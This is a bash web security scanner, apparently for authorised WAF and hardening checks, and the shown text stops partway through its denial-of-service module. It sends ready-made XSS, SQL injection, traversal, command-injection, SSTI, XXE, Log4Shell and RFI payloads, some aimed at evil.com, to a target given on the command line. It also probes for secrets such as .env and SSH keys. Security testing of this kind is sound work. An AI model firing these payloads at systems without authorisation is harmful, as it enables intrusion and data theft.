#!/bin/bash
# webscan.sh — Advanced Web Security Assessment Tool
# Usage: ./webscan.sh <domain> [origin-ip]
# Example: ./webscan.sh example.com 1.2.3.4
# Example: ./webscan.sh example.com

set -uo pipefail

TARGET_DOMAIN="${1:-}"
ORIGIN_IP="${2:-}"
PASS=0
FAIL=0
WARN=0
INFO_COUNT=0
FAIL_MSGS=()
WARN_MSGS=()

if [[ -z "$TARGET_DOMAIN" ]]; then
    echo "Usage: $0 <domain> [origin-ip]"
    echo "       $0 example.com"
    echo "       $0 example.com 1.2.3.4"
    exit 1
fi

TARGET="https://${TARGET_DOMAIN}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="webscan_${TARGET_DOMAIN}_${TIMESTAMP}.log"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
DIM='\033[2m'
RESET='\033[0m'
BOLD='\033[1m'

log() { echo -e "$*" | tee -a "$LOG_FILE"; }

banner() {
    log ""
    log "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
    log "${CYAN}${BOLD}║  $1${RESET}"
    log "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
}

section() {
    log ""
    log "${WHITE}${BOLD}  ▸ ${1}${RESET}"
    log "${DIM}  ──────────────────────────────────────────────────────────────${RESET}"
}

pass()  { log "  ${GREEN}[PASS]${RESET} $1"; ((PASS++)); }
fail()  { log "  ${RED}[FAIL]${RESET} $1"; ((FAIL++)); FAIL_MSGS+=("$1"); }
warn()  { log "  ${YELLOW}[WARN]${RESET} $1"; ((WARN++)); WARN_MSGS+=("$1"); }
info()  { log "  ${DIM}[INFO]${RESET} $1"; ((INFO_COUNT++)); }
finding() { log "  ${BLUE}[FIND]${RESET} $1"; }

http_code() {
    local url="$1"; local args="${2:-}"
    curl -sk $args "$url" -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 12 2>/dev/null
}

http_body() {
    local url="$1"; local args="${2:-}"
    curl -sk $args "$url" --connect-timeout 8 --max-time 12 2>/dev/null
}

http_headers() {
    local url="$1"
    curl -sI "$url" --connect-timeout 8 --max-time 12 2>/dev/null
}

check_code() {
    local desc="$1" url="$2" expected="$3" args="${4:-}"
    local code; code=$(http_code "$url" "$args")
    if [[ "$code" == "$expected" ]]; then
        pass "$desc → ${code}"
    else
        fail "$desc → got ${code}, expected ${expected}"
    fi
}

# ──────────────────────────────────────────────────────────────────────────────
clear
log "${CYAN}"
log " ██╗    ██╗███████╗██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗"
log " ██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║"
log " ██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ███████║██╔██╗ ██║"
log " ██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██║██║╚██╗██║"
log " ╚███╔███╔╝███████╗██████╔╝███████║╚██████╗██║  ██║██║ ╚████║"
log "  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝"
log "${RESET}"
log "${WHITE}${BOLD}  Advanced Web Security Assessment Tool${RESET}"
log "${DIM}  Target : ${TARGET}${RESET}"
[[ -n "$ORIGIN_IP" ]] && log "${DIM}  Origin : ${ORIGIN_IP}${RESET}"
log "${DIM}  Date   : $(date)${RESET}"
log "${DIM}  Log    : ${LOG_FILE}${RESET}"
log ""

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 1 — RECONNAISSANCE"
# ──────────────────────────────────────────────────────────────────────────────

section "DNS Enumeration"
DNS_IPS=$(dig +short "$TARGET_DOMAIN" 2>/dev/null || host "$TARGET_DOMAIN" 2>/dev/null | grep "has address" | awk '{print $4}')
if [[ -n "$DNS_IPS" ]]; then
    info "Resolved IPs: $DNS_IPS"
else
    warn "Could not resolve DNS for $TARGET_DOMAIN"
fi

MX=$(dig +short MX "$TARGET_DOMAIN" 2>/dev/null)
[[ -n "$MX" ]] && info "MX records: $MX"

TXT=$(dig +short TXT "$TARGET_DOMAIN" 2>/dev/null)
[[ -n "$TXT" ]] && info "TXT records: $TXT"

section "HTTP Response Fingerprinting"
HEADERS=$(http_headers "$TARGET")
SERVER=$(echo "$HEADERS" | grep -i "^server:" | tr -d '\r')
POWERED=$(echo "$HEADERS" | grep -i "^x-powered-by:" | tr -d '\r')
VIA=$(echo "$HEADERS" | grep -i "^via:" | tr -d '\r')
X_GEN=$(echo "$HEADERS" | grep -i "^x-generator:" | tr -d '\r')

[[ -n "$SERVER" ]]  && finding "Server header: $SERVER"
[[ -n "$POWERED" ]] && finding "X-Powered-By: $POWERED"
[[ -n "$VIA" ]]     && finding "Via: $VIA"
[[ -n "$X_GEN" ]]   && finding "X-Generator: $X_GEN"

HTTP_VER=$(curl -sI --http1.1 "$TARGET" -o /dev/null -w "%{http_version}" --connect-timeout 8 2>/dev/null)
info "HTTP version negotiated: $HTTP_VER"

section "SSL/TLS Certificate Intelligence"
CERT=$(echo Q | openssl s_client -connect "${TARGET_DOMAIN}:443" -servername "$TARGET_DOMAIN" 2>/dev/null | openssl x509 -noout -text 2>/dev/null)
if [[ -n "$CERT" ]]; then
    SUBJECT=$(echo "$CERT" | grep "Subject:" | head -1 | xargs)
    ISSUER=$(echo "$CERT" | grep "Issuer:" | head -1 | xargs)
    EXPIRY=$(echo "$CERT" | grep "Not After" | xargs)
    SANS=$(echo "$CERT" | grep -A1 "Subject Alternative Name" | tail -1 | xargs)
    info "Subject : $SUBJECT"
    info "Issuer  : $ISSUER"
    info "Expiry  : $EXPIRY"
    [[ -n "$SANS" ]] && finding "SANs (potential subdomain intel): $SANS"
else
    warn "Could not retrieve SSL certificate"
fi

section "Robots.txt & Sitemap Discovery"
ROBOTS=$(http_body "$TARGET/robots.txt")
if echo "$ROBOTS" | grep -qi "disallow\|allow"; then
    finding "robots.txt found — potential path disclosure:"
    echo "$ROBOTS" | grep -i "disallow\|allow" | head -20 | while read -r line; do
        info "  $line"
    done
else
    info "robots.txt not present or empty"
fi

SITEMAP_CODE=$(http_code "$TARGET/sitemap.xml")
[[ "$SITEMAP_CODE" == "200" ]] && finding "sitemap.xml accessible (200)"

section "Technology Stack Fingerprinting"
BODY=$(http_body "$TARGET")
echo "$BODY" | grep -qi "wp-content\|wp-json\|wordpress" && finding "WordPress detected"
echo "$BODY" | grep -qi "Drupal\|drupal.org" && finding "Drupal detected"
echo "$BODY" | grep -qi "Joomla" && finding "Joomla detected"
echo "$BODY" | grep -qi "react\|__NEXT_DATA__\|_next/" && finding "React/Next.js detected"
echo "$BODY" | grep -qi "ng-version\|angular" && finding "Angular detected"
echo "$BODY" | grep -qi "vue\|nuxt" && finding "Vue/Nuxt detected"
echo "$BODY" | grep -qi "laravel\|csrf-token" && finding "Laravel detected"
echo "$BODY" | grep -qi "django\|csrfmiddlewaretoken" && finding "Django detected"
echo "$HEADERS" | grep -qi "x-aspnet\|aspnet\|asp.net" && finding "ASP.NET detected"
echo "$HEADERS" | grep -qi "x-drupal\|drupal" && finding "Drupal header detected"
info "Stack fingerprinting complete"

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 2 — ORIGIN IP BYPASS"
# ──────────────────────────────────────────────────────────────────────────────

if [[ -n "$ORIGIN_IP" ]]; then
    section "Direct Origin Access (WAF/CDN Bypass)"
    for scheme in http https; do
        code=$(curl -sk -H "Host: ${TARGET_DOMAIN}" "${scheme}://${ORIGIN_IP}/" \
            -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
        if [[ "$code" == "000" || "$code" == "403" ]]; then
            pass "Direct ${scheme^^} to origin → ${code} (protected)"
        else
            fail "Direct ${scheme^^} to origin → ${code} (CDN BYPASSED — origin exposed)"
        fi
    done

    section "Host Header Injection"
    for host_val in "evil.com" "localhost" "127.0.0.1" "${TARGET_DOMAIN}.evil.com"; do
        code=$(curl -sk -H "Host: ${host_val}" "https://${TARGET_DOMAIN}/" \
            -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
        info "Host: ${host_val} → ${code}"
    done

    section "X-Forwarded-For / IP Spoofing"
    for xff in "127.0.0.1" "10.0.0.1" "192.168.1.1" "::1"; do
        code=$(curl -sk -H "X-Forwarded-For: ${xff}" "$TARGET/" \
            -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
        info "X-Forwarded-For: ${xff} → ${code}"
    done
else
    info "No origin IP provided — skipping Module 2 (pass --origin-ip to enable)"
fi

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 3 — INJECTION ATTACKS"
# ──────────────────────────────────────────────────────────────────────────────

section "Cross-Site Scripting (XSS)"
XSS_PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "'\"><script>alert(1)</script>"
    "<svg onload=alert(1)>"
    "javascript:alert(1)"
    "<body onload=alert(1)>"
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
    "<ScRiPt>alert(1)</sCrIpT>"
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
)
for payload in "${XSS_PAYLOADS[@]}"; do
    code=$(http_code "${TARGET}/?q=${payload}")
    if [[ "$code" == "403" || "$code" == "400" ]]; then
        pass "XSS blocked: ${payload:0:40}… → ${code}"
    else
        fail "XSS not blocked: ${payload:0:40}… → ${code}"
    fi
done

section "SQL Injection"
SQLI_PAYLOADS=(
    "1' OR '1'='1"
    "1; DROP TABLE users--"
    "' UNION SELECT null,null,null--"
    "1' AND SLEEP(0)--"
    "admin'--"
    "1' OR 1=1--"
    "' OR 'x'='x"
    "1; SELECT * FROM information_schema.tables--"
    "%27%20OR%20%271%27%3D%271"
    "1' WAITFOR DELAY '0:0:0'--"
)
for payload in "${SQLI_PAYLOADS[@]}"; do
    code=$(http_code "${TARGET}/?id=${payload}")
    if [[ "$code" == "403" || "$code" == "400" ]]; then
        pass "SQLi blocked: ${payload:0:40}… → ${code}"
    else
        fail "SQLi not blocked: ${payload:0:40}… → ${code}"
    fi
done

section "Path Traversal / LFI"
TRAVERSAL_PAYLOADS=(
    "../../../etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "../../../etc/passwd%00"
    "../../../windows/system32/drivers/etc/hosts"
    "../../../../../../../../etc/shadow"
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
)
for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    code=$(http_code "${TARGET}/?file=${payload}")
    body=$(http_body "${TARGET}/?file=${payload}")
    if echo "$body" | grep -q "root:x:\|bin:x:"; then
        fail "LFI SUCCESS — /etc/passwd read with: ${payload:0:40}…"
    elif [[ "$code" == "403" || "$code" == "400" ]]; then
        pass "Traversal blocked: ${payload:0:40}… → ${code}"
    else
        fail "Traversal not blocked: ${payload:0:40}… → ${code}"
    fi
done

section "Remote File Inclusion (RFI)"
RFI_PAYLOADS=(
    "http://evil.com/shell.php"
    "https://evil.com/shell.txt"
    "ftp://evil.com/shell.php"
    "http://169.254.169.254/latest/meta-data/"
    "http://127.0.0.1/admin"
    "file:///etc/passwd"
)
for payload in "${RFI_PAYLOADS[@]}"; do
    code=$(http_code "${TARGET}/?page=${payload}")
    if [[ "$code" == "403" || "$code" == "400" ]]; then
        pass "RFI blocked: ${payload:0:50}… → ${code}"
    else
        fail "RFI not blocked: ${payload:0:50}… → ${code}"
    fi
done

section "Command Injection"
CMD_PAYLOADS=(
    ";id"
    "|id"
    "\`id\`"
    ";cat /etc/passwd"
    "&&cat /etc/passwd"
    "||cat /etc/passwd"
    ";ls -la"
    "\$(id)"
    "%3Bid"
    "%7Cid"
    "; ping -c1 127.0.0.1"
)
for payload in "${CMD_PAYLOADS[@]}"; do
    code=$(http_code "${TARGET}/?cmd=${payload}")
    body=$(http_body "${TARGET}/?cmd=${payload}")
    if echo "$body" | grep -qE "uid=[0-9]|root:|www-data"; then
        fail "COMMAND INJECTION SUCCESS with: ${payload}"
    elif [[ "$code" == "403" || "$code" == "400" ]]; then
        pass "CMDi blocked: ${payload:0:30}… → ${code}"
    else
        fail "CMDi not blocked: ${payload:0:30}… → ${code}"
    fi
done

section "Server-Side Template Injection (SSTI)"
SSTI_PAYLOADS=(
    "{{7*7}}"
    "\${7*7}"
    "{{7*'7'}}"
    "<%= 7*7 %>"
    "#{7*7}"
    "*{7*7}"
    "{{config}}"
    "{{''.class.mro[2].subclasses()}}"
    "\${{<%[%'\"}}%\\"
)
for payload in "${SSTI_PAYLOADS[@]}"; do
    code=$(http_code "${TARGET}/?name=${payload}")
    body=$(http_body "${TARGET}/?name=${payload}")
    if echo "$body" | grep -qE "^49$|Result: 49|>49<"; then
        fail "SSTI SUCCESS — math evaluated (49): ${payload}"
    elif [[ "$code" == "403" || "$code" == "400" ]]; then
        pass "SSTI blocked: ${payload:0:30}… → ${code}"
    else
        fail "SSTI not blocked: ${payload:0:30}… → ${code}"
    fi
done

section "XXE Injection"
XXE_BODY='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
code=$(curl -sk -X POST "$TARGET/" \
    -H "Content-Type: application/xml" \
    -d "$XXE_BODY" \
    -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
if [[ "$code" == "403" || "$code" == "400" || "$code" == "405" ]]; then
    pass "XXE payload blocked → ${code}"
else
    fail "XXE payload not blocked → ${code}"
fi

section "Log4Shell / JNDI Injection"
LOG4J_PAYLOADS=(
    "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D"
    "%24%7Bjndi%3Adns%3A%2F%2Fevil.com%7D"
    "%24%7B%24%7Blower%3Aj%7D%24%7Blower%3An%7D%24%7Blower%3Ad%7D%24%7Blower%3Ai%7D%3Aldap%3A%2F%2Fevil.com%7D"
)
for payload in "${LOG4J_PAYLOADS[@]}"; do
    code=$(http_code "${TARGET}/?x=${payload}")
    if [[ "$code" == "403" || "$code" == "400" ]]; then
        pass "Log4Shell blocked → ${code}"
    else
        fail "Log4Shell not blocked → ${code}"
    fi
    code2=$(curl -sk "$TARGET/" \
        -H "X-Api-Version: \${jndi:ldap://evil.com/a}" \
        -H "User-Agent: \${jndi:ldap://evil.com/a}" \
        -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
    if [[ "$code2" == "403" || "$code2" == "400" ]]; then
        pass "Log4Shell via headers blocked → ${code2}"
    else
        fail "Log4Shell via headers not blocked → ${code2}"
    fi
    break
done

section "HTTP Parameter Pollution (HPP)"
HPP_TESTS=(
    "?id=1&id=2"
    "?user=admin&user=guest"
    "?role=user&role=admin"
)
for test in "${HPP_TESTS[@]}"; do
    code=$(http_code "${TARGET}/${test}")
    info "HPP ${test} → ${code}"
done

section "CRLF / Header Injection"
CRLF_PAYLOADS=(
    "%0d%0aSet-Cookie:evil=1"
    "%0aLocation:https://evil.com"
    "%0d%0aContent-Length:0%0d%0aHTTP/1.1 200 OK"
)
for payload in "${CRLF_PAYLOADS[@]}"; do
    code=$(http_code "${TARGET}/?url=${payload}")
    if [[ "$code" == "403" || "$code" == "400" ]]; then
        pass "CRLF injection blocked: ${payload:0:40}… → ${code}"
    else
        fail "CRLF not blocked: ${payload:0:40}… → ${code}"
    fi
done

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 4 — HTTP METHOD & PROTOCOL ABUSE"
# ──────────────────────────────────────────────────────────────────────────────

section "HTTP Method Testing"
declare -A METHOD_EXPECT=(
    ["GET"]="200"
    ["HEAD"]="200"
    ["POST"]="any"
    ["PUT"]="block"
    ["DELETE"]="block"
    ["PATCH"]="block"
    ["TRACE"]="block"
    ["CONNECT"]="block"
    ["OPTIONS"]="any"
    ["PROPFIND"]="block"
    ["MOVE"]="block"
    ["COPY"]="block"
)
for method in GET HEAD POST PUT DELETE PATCH TRACE CONNECT OPTIONS PROPFIND MOVE COPY; do
    code=$(curl -sk -X "$method" "$TARGET/" -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
    expected="${METHOD_EXPECT[$method]}"
    if [[ "$expected" == "200" && "$code" == "200" ]]; then
        pass "Method ${method} → ${code} (allowed)"
    elif [[ "$expected" == "block" && ( "$code" == "403" || "$code" == "405" || "$code" == "501" ) ]]; then
        pass "Method ${method} → ${code} (blocked)"
    elif [[ "$expected" == "any" ]]; then
        info "Method ${method} → ${code}"
    else
        fail "Method ${method} → ${code} (unexpected)"
    fi
done

section "HTTP Request Smuggling Probe"
SMUGGLE=$(curl -sk -X POST "$TARGET/" \
    -H "Transfer-Encoding: chunked" \
    -H "Content-Length: 4" \
    -d "0\r\n\r\n" \
    -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
info "HTTP smuggling probe (TE+CL) → ${SMUGGLE}"

section "HTTP/2 Downgrade"
H2_CODE=$(curl -sk --http2 "$TARGET/" -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
H1_CODE=$(curl -sk --http1.1 "$TARGET/" -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
info "HTTP/2 response: ${H2_CODE}"
info "HTTP/1.1 response: ${H1_CODE}"

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 5 — SECURITY HEADERS AUDIT"
# ──────────────────────────────────────────────────────────────────────────────

section "Required Security Headers"
declare -A REQUIRED_HEADERS=(
    ["strict-transport-security"]="HSTS"
    ["content-security-policy"]="CSP"
    ["x-frame-options"]="Clickjacking protection"
    ["x-content-type-options"]="MIME sniffing protection"
    ["referrer-policy"]="Referrer policy"
    ["permissions-policy"]="Permissions policy"
    ["cross-origin-opener-policy"]="COOP"
    ["cross-origin-resource-policy"]="CORP"
    ["cross-origin-embedder-policy"]="COEP"
)
RESP_HEADERS=$(http_headers "$TARGET")
for header in "${!REQUIRED_HEADERS[@]}"; do
    label="${REQUIRED_HEADERS[$header]}"
    val=$(echo "$RESP_HEADERS" | grep -i "^${header}:" | tr -d '\r')
    if [[ -n "$val" ]]; then
        pass "${label} (${header}) present"
        info "  → ${val}"
    else
        fail "${label} (${header}) MISSING"
    fi
done

section "Dangerous Headers That Should Be Absent"
for header in "x-powered-by" "server" "x-aspnet-version" "x-aspnetmvc-version"; do
    val=$(echo "$RESP_HEADERS" | grep -i "^${header}:" | tr -d '\r')
    if [[ -z "$val" ]]; then
        pass "Header ${header} not exposed"
    else
        fail "Header ${header} exposes info: ${val}"
    fi
done

section "ETag Information Disclosure"
ETAG=$(echo "$RESP_HEADERS" | grep -i "^etag:" | tr -d '\r')
if [[ -z "$ETAG" ]]; then
    pass "ETag not present"
else
    fail "ETag exposed (potential inode/file info leak): ${ETAG}"
fi

section "HSTS Preload Validation"
HSTS=$(echo "$RESP_HEADERS" | grep -i "strict-transport-security" | tr -d '\r')
if echo "$HSTS" | grep -q "max-age"; then
    pass "HSTS max-age present"
else fail "HSTS max-age missing"; fi
if echo "$HSTS" | grep -q "includeSubDomains"; then
    pass "HSTS includeSubDomains present"
else warn "HSTS includeSubDomains missing"; fi
if echo "$HSTS" | grep -q "preload"; then
    pass "HSTS preload flag set"
else warn "HSTS preload not set"; fi

section "CSP Analysis"
CSP=$(echo "$RESP_HEADERS" | grep -i "content-security-policy:" | tr -d '\r')
echo "$CSP" | grep -q "unsafe-eval"  && fail "CSP contains 'unsafe-eval'"
echo "$CSP" | grep -q "unsafe-inline" && warn "CSP contains 'unsafe-inline' (check if avoidable)"
echo "$CSP" | grep -q "default-src"  && pass "CSP has default-src directive"
echo "$CSP" | grep -q "\*"           && fail "CSP wildcard (*) detected — overly permissive"
echo "$CSP" | grep -q "frame-ancestors" && pass "CSP frame-ancestors set"
echo "$CSP" | grep -q "base-uri"    && pass "CSP base-uri set"
echo "$CSP" | grep -q "form-action" && pass "CSP form-action set"

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 6 — SENSITIVE FILE & DIRECTORY EXPOSURE"
# ──────────────────────────────────────────────────────────────────────────────

section "Critical File Access"
declare -A SENSITIVE=(
    ["/.env"]="Environment file"
    ["/.env.local"]="Local env file"
    ["/.env.production"]="Production env file"
    ["/.env.backup"]="Env backup"
    ["/.git/config"]="Git config"
    ["/.git/HEAD"]="Git HEAD"
    ["/.git/COMMIT_EDITMSG"]="Git commit log"
    ["/.git/index"]="Git index"
    ["/.gitignore"]="gitignore (path disclosure)"
    ["/.htaccess"]="Apache htaccess"
    ["/.htpasswd"]="Apache htpasswd"
    ["/.ssh/id_rsa"]="SSH private key"
    ["/.ssh/authorized_keys"]="SSH authorized keys"
    ["/config.php"]="PHP config"
    ["/config.yml"]="YAML config"
    ["/config.json"]="JSON config"
    ["/database.yml"]="DB config"
    ["/wp-config.php"]="WordPress config"
    ["/wp-config.php.bak"]="WP config backup"
    ["/phpinfo.php"]="PHP info"
    ["/info.php"]="PHP info alt"
    ["/test.php"]="PHP test file"
    ["/shell.php"]="Webshell"
    ["/cmd.php"]="Command shell"
    ["/backup.zip"]="Backup archive"
    ["/backup.tar.gz"]="Backup tarball"
    ["/dump.sql"]="SQL dump"
    ["/db.sql"]="DB dump"
    ["/error.log"]="Error log"
    ["/access.log"]="Access log"
    ["/debug.log"]="Debug log"
    ["/server-status"]="Apache server-status"
    ["/server-info"]="Apache server-info"
    ["/nginx_status"]="Nginx status"
    ["/admin"]="Admin panel"
    ["/admin.php"]="Admin PHP"
    ["/administrator"]="Admin dir"
    ["/phpmyadmin"]="phpMyAdmin"
    ["/pma"]="phpMyAdmin alt"
    ["/manager"]="Manager panel"
    ["/console"]="Console"
    ["/actuator"]="Spring Boot actuator"
    ["/actuator/env"]="Actuator env"
    ["/actuator/health"]="Actuator health"
    ["/.DS_Store"]="macOS metadata"
    ["/crossdomain.xml"]="Flash crossdomain"
    ["/clientaccesspolicy.xml"]="Silverlight policy"
    ["/package.json"]="Node package.json"
    ["/composer.json"]="PHP composer"
    ["/Dockerfile"]="Docker config"
    ["/docker-compose.yml"]="Docker compose"
    ["/.dockerenv"]="Docker env marker"
    ["/Makefile"]="Makefile"
    ["/README.md"]="README (tech disclosure)"
)
for path in "${!SENSITIVE[@]}"; do
    label="${SENSITIVE[$path]}"
    code=$(http_code "${TARGET}${path}")
    if [[ "$code" == "200" ]]; then
        fail "EXPOSED: ${path} → ${code} (${label})"
    elif [[ "$code" == "403" ]]; then
        pass "Blocked: ${path} → ${code}"
    elif [[ "$code" == "404" ]]; then
        pass "Not found: ${path} → ${code}"
    else
        info "${path} → ${code} (${label})"
    fi
done

section "API Endpoint Discovery"
API_ENDPOINTS=(
    "/api" "/api/v1" "/api/v2" "/api/v3"
    "/api/users" "/api/admin" "/api/config"
    "/api/debug" "/api/health" "/api/status"
    "/rest" "/graphql" "/swagger" "/swagger-ui.html"
    "/openapi.json" "/api-docs" "/.well-known/openid-configuration"
)
for ep in "${API_ENDPOINTS[@]}"; do
    code=$(http_code "${TARGET}${ep}")
    if [[ "$code" == "200" ]]; then
        finding "API endpoint accessible: ${ep} → ${code}"
    fi
done

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 7 — AUTHENTICATION & SESSION TESTING"
# ──────────────────────────────────────────────────────────────────────────────

section "Default Credential Paths"
AUTH_PATHS=(
    "/login" "/signin" "/auth" "/authenticate"
    "/admin/login" "/wp-login.php" "/user/login"
    "/account/login" "/panel" "/dashboard"
)
for path in "${AUTH_PATHS[@]}"; do
    code=$(http_code "${TARGET}${path}")
    [[ "$code" == "200" || "$code" == "301" || "$code" == "302" ]] && finding "Auth page: ${path} → ${code}"
done

section "Cookie Security Flags"
SET_COOKIE=$(http_headers "$TARGET" | grep -i "set-cookie" | tr -d '\r')
if [[ -n "$SET_COOKIE" ]]; then
    finding "Cookies set: $SET_COOKIE"
    echo "$SET_COOKIE" | grep -qi "httponly" && pass "HttpOnly flag set" || fail "HttpOnly flag MISSING"
    echo "$SET_COOKIE" | grep -qi "secure" && pass "Secure flag set" || fail "Secure flag MISSING"
    echo "$SET_COOKIE" | grep -qi "samesite" && pass "SameSite flag set" || warn "SameSite flag not set"
else
    info "No Set-Cookie headers on initial response"
fi

section "Open Redirect Testing"
REDIRECT_PAYLOADS=(
    "https://evil.com"
    "//evil.com"
    "/\\evil.com"
    "https://evil.com%2F@${TARGET_DOMAIN}"
)
for payload in "${REDIRECT_PAYLOADS[@]}"; do
    code=$(curl -sk "${TARGET}/?url=${payload}" -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
    LOC=$(curl -sI "${TARGET}/?url=${payload}" --connect-timeout 8 2>/dev/null | grep -i "^location:" | tr -d '\r')
    if echo "$LOC" | grep -qi "evil.com"; then
        fail "Open redirect to evil.com via: ?url=${payload:0:40}"
    else
        pass "Open redirect blocked: ${payload:0:40}… → ${code}"
    fi
    code2=$(curl -sk "${TARGET}/?redirect=${payload}" -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
    LOC2=$(curl -sI "${TARGET}/?redirect=${payload}" --connect-timeout 8 2>/dev/null | grep -i "^location:" | tr -d '\r')
    [[ -n "$LOC2" ]] && echo "$LOC2" | grep -qi "evil.com" && \
        fail "Open redirect via ?redirect → ${LOC2}"
done

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 8 — BOT & SCANNER DETECTION"
# ──────────────────────────────────────────────────────────────────────────────

section "Known Malicious User Agents"
declare -A BOTS=(
    ["sqlmap/1.0"]="sqlmap"
    ["Nikto/2.1.6"]="Nikto"
    ["masscan/1.0"]="masscan"
    ["zgrab/0.x"]="zgrab"
    ["Nmap Scripting Engine"]="Nmap NSE"
    ["nuclei/2.0"]="nuclei"
    ["WPScan v3"]="WPScan"
    ["dirbuster/1.0"]="DirBuster"
    ["python-requests/2.0"]="python-requests"
    ["curl/0.0 (libwww-perl)"]="libwww-perl"
    ["Go-http-client/1.1"]="Go HTTP client"
    ["Wget/1.0"]="Wget"
    ["Scrapy/1.0"]="Scrapy"
    ["HTTPie/0.9"]="HTTPie"
)
for ua in "${!BOTS[@]}"; do
    label="${BOTS[$ua]}"
    code=$(curl -sk "$TARGET/" -A "$ua" -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
    if [[ "$code" == "403" || "$code" == "000" || "$code" == "429" ]]; then
        pass "${label} UA blocked → ${code}"
    else
        warn "${label} UA not blocked → ${code}"
    fi
done

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 9 — TLS / SSL DEEP AUDIT"
# ──────────────────────────────────────────────────────────────────────────────

section "TLS Version Support"
for tls in "-tls1" "-tls1_1" "-tls1_2" "-tls1_3"; do
    result=$(echo Q | openssl s_client -connect "${TARGET_DOMAIN}:443" $tls 2>&1 \
        | grep -E "alert|handshake failure|Protocol|Cipher" | head -2)
    if echo "$result" | grep -qi "alert\|failure"; then
        [[ "$tls" == "-tls1" || "$tls" == "-tls1_1" ]] && \
            pass "Legacy TLS ${tls} rejected (correct)" || \
            fail "Modern TLS ${tls} rejected (unexpected)"
    else
        [[ "$tls" == "-tls1" || "$tls" == "-tls1_1" ]] && \
            fail "Legacy TLS ${tls} ACCEPTED (should be disabled)" || \
            pass "Modern TLS ${tls} accepted (correct)"
    fi
done

section "Cipher Suite Quality"
CIPHERS=$(echo Q | openssl s_client -connect "${TARGET_DOMAIN}:443" -tls1_2 2>/dev/null | grep "Cipher")
info "Negotiated cipher: $CIPHERS"
echo "$CIPHERS" | grep -qiE "RC4|MD5|NULL|EXPORT|DES|anon" && \
    fail "Weak cipher detected: $CIPHERS" || \
    pass "No weak ciphers negotiated"

section "Certificate Validity"
CERT_EXPIRY=$(echo Q | openssl s_client -connect "${TARGET_DOMAIN}:443" -servername "$TARGET_DOMAIN" 2>/dev/null \
    | openssl x509 -noout -enddate 2>/dev/null | cut -d= -f2)
if [[ -n "$CERT_EXPIRY" ]]; then
    EXPIRY_EPOCH=$(date -d "$CERT_EXPIRY" +%s 2>/dev/null || date -j -f "%b %d %H:%M:%S %Y %Z" "$CERT_EXPIRY" +%s 2>/dev/null)
    NOW_EPOCH=$(date +%s)
    DAYS_LEFT=$(( (EXPIRY_EPOCH - NOW_EPOCH) / 86400 ))
    if [[ $DAYS_LEFT -gt 30 ]]; then
        pass "Certificate valid for ${DAYS_LEFT} days (expires: $CERT_EXPIRY)"
    elif [[ $DAYS_LEFT -gt 0 ]]; then
        warn "Certificate expires in ${DAYS_LEFT} days — renew soon"
    else
        fail "Certificate EXPIRED"
    fi
fi

section "Mixed Content & HTTP Redirect"
HTTP_CODE=$(curl -sk -L "http://${TARGET_DOMAIN}/" -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
HTTP_REDIR=$(curl -sI "http://${TARGET_DOMAIN}/" --connect-timeout 8 2>/dev/null | grep -i "^location:" | tr -d '\r')
if echo "$HTTP_REDIR" | grep -q "https://"; then
    pass "HTTP → HTTPS redirect in place → ${HTTP_REDIR}"
else
    fail "No HTTP → HTTPS redirect detected"
fi

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 10 — DENIAL OF SERVICE RESILIENCE"
# ──────────────────────────────────────────────────────────────────────────────

section "Large Request Body"
LARGE_BODY=$(python3 -c "print('A'*100000)" 2>/dev/null || printf 'A%.0s' {1..10000})
code=$(echo "$LARGE_BODY" | curl -sk -X POST "$TARGET/" \
    -H "Content-Type: text/plain" \
    --data-binary @- \
    -o /dev/null -w "%{http_code}" --connect-timeout 10 2>/dev/null)
if [[ "$code" == "413" || "$code" == "403" || "$code" == "400" ]]; then
    pass "Large request body handled → ${code}"
else
